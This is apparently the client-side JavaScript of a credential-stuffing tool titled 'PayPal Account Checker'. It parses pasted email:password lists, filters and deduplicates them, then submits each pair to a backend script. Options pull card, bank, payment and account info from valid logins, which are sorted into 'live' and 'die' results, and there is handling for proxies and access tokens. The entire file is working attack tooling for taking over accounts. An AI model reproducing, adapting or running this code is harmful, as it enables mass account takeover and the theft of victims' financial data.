var ajaxCall;

Array.prototype.remove = function(value){
    var index = this.indexOf(value);
    if(index != -1){
        this.splice(index, 1);
    }
    return this;
};
function enableTextArea(bool){
    $('#mailpass').attr('disabled', bool);
}
function ppliveUp(){
    var count = parseInt($('#clive').html());
    count++;
    $('#pplive_count').html(count+'');
    $('#clive').html(count+'');
}
function pptimeUp(exe_time){
    var count = parseFloat($('#time').html());
    count=count+parseFloat(exe_time);
    $('#time').html(count+'');
}
function pptotalUp(len){
    var count = parseInt($('#ctotal').html());
    count=count+len;
    $('#ctotal').html(count+'');
}
function ppdieUp(){
    var count = parseInt($('#ppdie_count').html());
    count++;
    $('#ppdie_count').html(count+'');
    $('#cdie').html(count+'');
}

function stopLoading(bool){
    $('#loading').attr('src', 'clear.gif');
    var str = $('#checkStatus').html();
    $('#checkStatus').html(str.replace('Checking','Stopped'));
    enableTextArea(false);
    $('#submit').attr('disabled', false);
    $('#stop').attr('disabled', true);
    if(bool){
        alert('Done!');
    }else{
        ajaxCall.abort();
    }
    updateTitle('PayPal Account Checker - SilentChild12');
}
function updateTitle(str){
    document.title = str;
}
function updateTextBox(mp){
    var mailpass = $('#mailpass').val().split("\n");
    mailpass.remove(mp);
    $('#mailpass').val(mailpass.join("\n"));
}
function checkPaypal(lstMP, curMP, delim, cEmail,info,card,bank,payment,alltoken, no, a, mplist){
	$('#loading').show();
	$('#finish').hide();
    if( lstMP.length<1 ||curMP>=lstMP.length ){
		pptotalUp(mplist);
        stopLoading(true);
		$('#loading').hide();
		$('#finish').show();
		$('#result').show();
		var b = performance.now();
		var c = ((b - a)/1000/60);
		pptimeUp(c.toFixed(2));
        return false;
    }
	$("#now").text(no);
	$("#last").text(lstMP.length);
	var csrf = $('#token').val().trim();
    ajaxCall = $.ajax({
        url: 'post.php',
        dataType: 'json',
        cache: false,
        type: 'POST',
        beforeSend: function (e) {
            updateTitle('Checking at '+no+'/'+lstMP.length+' ~ SilentChild12');
			$('#checkStatus').html('Checking:' + lstMP[curMP]).effect("highlight", {color:'#00ff00'}, 1000);
			$('#checkStatus').css('color', 'limegreen');
            $('#loading').attr('src', 'loading.gif');
		},
        data: 'ajax=1&do=check&mailpass='+encodeURIComponent(lstMP[curMP])
                +'&delim='+encodeURIComponent(delim)+'&email='+cEmail+'&info='+info+'&card='+card+'&bank='+bank+'&payment='+payment+'&token='+csrf,
        success: function(data) {
            switch(data.error){
                case -1:
					if(alltoken==1){
						$('#use').click();
						setTimeout(function(){
							$('#submit').click();
							return;
						}, 4000);
						return;
					}else{
						$('#ctoken').val('').effect("highlight", {color:'red'}, 1000);
						$("#use").prop('disabled', false);
						$("#token").prop('disabled', false);
						$("#use").val('Use My Access Token!').effect("highlight", {color:'white'}, 1000);
						$('#use').css('color', 'white');
						$('#token').val('NOT VALID ACCES TOKEN !');
						$('#token').css('background', 'rgba(0,0,0, 0.8)');
						stopLoading(true);
						$('#loading').hide();
						return false;
					}
					break;
                case 1:
                case 3:
                    $('#badsock').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
                    break;
                case 2:
					updateTextBox(lstMP[curMP]);
                    curMP++;
					$('#token').css('background', 'rgba(0,225,0,0.4)');
                    document.getElementById('ppdie').innerHTML += data.msg + '\n';
                    ppdieUp();
                    break;
                case 0:
					updateTextBox(lstMP[curMP]);
                    curMP++;
                    $('#token').css('background', 'rgba(0,225,0,0.4)');
					$('#pplive').append(data.msg+'<br />').effect("highlight", {color:'#00ff00'}, 1000);
                    ppliveUp();
                    break;
            }
			no++;
            checkPaypal(lstMP, curMP, delim, cEmail,info,card,bank,payment,alltoken, no, a,mplist);
        }
    });
    return true;
}
function filterMP(mp, delim){
    var mps = mp.split("\n");
    var filtered = new Array();
    var lstMP = new Array();
    for(var i=0;i<mps.length;i++){
        if(mps[i].indexOf('@')!=-1){
            var infoMP = mps[i].split(delim);
            for(var k=0;k<infoMP.length;k++){
                if(infoMP[k].indexOf('@')!=-1){
                    var email = $.trim(infoMP[k]);
                    var pwd = $.trim(infoMP[k+1]);
					if(pwd.length>=8){
						if(filtered.indexOf(email.toLowerCase())==-1){
							filtered.push(email.toLowerCase());
							lstMP.push(email+'|'+pwd);
							break;
						}
					}
                }
            }
        }
    }
    return lstMP;
}


$(document).ready(function(){
    $('#stop').attr('disabled', true).click(function(){
      stopLoading(false);  
    });
	var no = 1;
    $('#submit').click(function(){
        var delim = $('#delim').val().trim();
        var a = performance.now();
        var mailpass = filterMP($('#mailpass').val(), delim);
		var mplist = mailpass.length;
        var regex = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/g;
        var bank = $('#bank').is(':checked') ? 1 : 0;
        var card = $('#card').is(':checked') ? 1 : 0;
        var info = $('#info').is(':checked') ? 1 : 0;
        var payment = $('#payment').is(':checked') ? 1 : 0;
        var cEmail = $('#email').is(':checked') ? 1 : 0;
		var alltoken = $('#alltoken').is(':checked') ? 1 : 0;
        if($('#mailpass').val().trim()==''){
            alert('No Mail/Pass found!');
            return false;
        }
		if($('#token').val().trim()==''){
            alert('Refill your Access Token!');
            return false;
        }
        $('#mailpass').val(mailpass.join("\n")).attr('disabled', true);
        $('#data').show();
		$('#result').hide();
        $('#submit').attr('disabled', true);
        $('#stop').attr('disabled', false);
        checkPaypal(mailpass, 0, delim, cEmail,info,card,bank,payment,alltoken, no, a,mplist);
        return false; 
    });
});